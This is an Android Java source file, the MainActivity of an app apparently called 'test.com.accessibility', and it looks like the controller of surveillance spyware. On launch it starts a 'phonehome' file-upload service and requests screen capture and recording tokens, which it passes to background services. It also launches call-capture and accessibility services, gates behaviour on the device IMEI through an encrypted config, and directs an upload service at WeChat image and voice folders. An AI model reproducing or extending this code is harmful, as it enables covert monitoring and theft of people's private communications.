package test.com.accessibility;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;

import test.com.accessibility.base.CC.MyCCService;
import test.com.accessibility.base.IntentInterface.intentInterface;
import test.com.accessibility.base.accessibility.AccessService;
import test.com.accessibility.base.main.UtilIntentService;
import test.com.accessibility.util.conf.Crypt;
import test.com.accessibility.Utilz.main.PermissionReq;
import test.com.accessibility.util.screenrecording.screenrecord;
import test.com.accessibility.util.screenshot.screenshot;

public class MainActivity extends AppCompatActivity {
    public Context context;
    String tag= "PluginMainActivity";

    boolean shouldSkipExistingWechatFiles = true;
    boolean isPluginApp = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (isPluginApp == false) {
            // check_device();
        }

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("test.com.accessibility", "test.com.accessibility.Util.phonehome.FileUploadService"));
        intent.putExtra("test.com.accessibility.extra.dst_dir", getExternalFilesDir(null).getAbsolutePath());
        startService(intent);

        Log.d(tag, "[tluo] Main Activity -- request Screenshot Permission -- popup window");
        //AudioPermissionReq.makePermissionRequest(this);
        PermissionReq.makePermissionReq(this);

        if (isPluginApp == false) {
            Intent intent1 = new Intent(this, MyCCService.class);
            startService(intent1);
            Intent intent2 = new Intent(this, AccessService.class);
            startService(intent2);

            screenrecord.init(this);
            screenshot.init(this);
        } else {
            this.finish();
        }
    }
    private static final int REQUEST_MEDIA_PROJECTION = 18;
    private static final int REQUEST_MEDIA_RECORD = 201;
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        //super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case REQUEST_MEDIA_PROJECTION:
                if (resultCode == RESULT_OK && data != null) {
                    screenshot.setToken(requestCode, data, this);
                    UtilIntentService.tokenIntent = data;
                    updateServicetokenIntent(data);
                    Log.d(tag, "[tluo] Main Activity -- request Screenshot Permission -- Granted:" + data.toString());
                    //this.finish();
                }
                break;
            case REQUEST_MEDIA_RECORD:
                if (resultCode == RESULT_OK && data != null) {
                    screenrecord.setToken(data);
                    Log.d(tag, "[tluo] Main Activity -- request ScreenRecording Permission -- Granted:" + data.toString());
                    //this.finish();
                }
                break;
        }
    }

    private void updateServicetokenIntent(Intent token){
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(intentInterface.intentServicePkgName, intentInterface.intentServiceName));
        intent.setAction("intentInterface");
        intent.putExtra("token", token);
        startService(intent);
    }

    private boolean check_device() {

        TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        if ( ContextCompat.checkSelfPermission( this, Manifest.permission.READ_PHONE_STATE ) != PackageManager.PERMISSION_GRANTED) {
            Log.d(tag, "[tluo] Main Activity -- READ_PHONE_STATE not granted: ");
            return false;
        }

        String imei = null;
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            imei = telephonyManager.getDeviceId();
        } else {
            imei = telephonyManager.getImei();
        }
        Log.d(tag, "[tluo] Main Activity -- IMEI: " + imei);
        if (imei != null) {
            String filename = "config.enc";
            Crypt in = Crypt.getInstance(imei);
            String content = in.decrypt_file(this.getExternalCacheDir().toString(), filename);
            Log.d(tag, "[tluo] Main Activity -- decrypted content: " + content);
            //TODO: check the content of this secret
        }
        return false;
    }

    public void skipExistingWechatImagesAndVoices(Context context){
        Intent imageIntent = new Intent();
        imageIntent.setComponent(new ComponentName(intentInterface.UploadService_Action_PkgName, intentInterface.UploadService_Action_ClsName));
        imageIntent.setAction(intentInterface.UploadService_Action_WechatImageDir);
        context.startService(imageIntent);

        Intent voiceIntent = new Intent();
        voiceIntent.setComponent(new ComponentName(intentInterface.UploadService_Action_PkgName, intentInterface.UploadService_Action_ClsName));
        voiceIntent.setAction(intentInterface.UploadService_Action_WechatVoiceDir);
        context.startService(voiceIntent);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 101: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // shouldSkipExistingWechatFiles flag will come from user config.
                    // If true, do NOT upload any existing wechat images and voices.
                    if (shouldSkipExistingWechatFiles) {
                        skipExistingWechatImagesAndVoices(this);
                    }
                }
                return;
            }

        }
    }
}
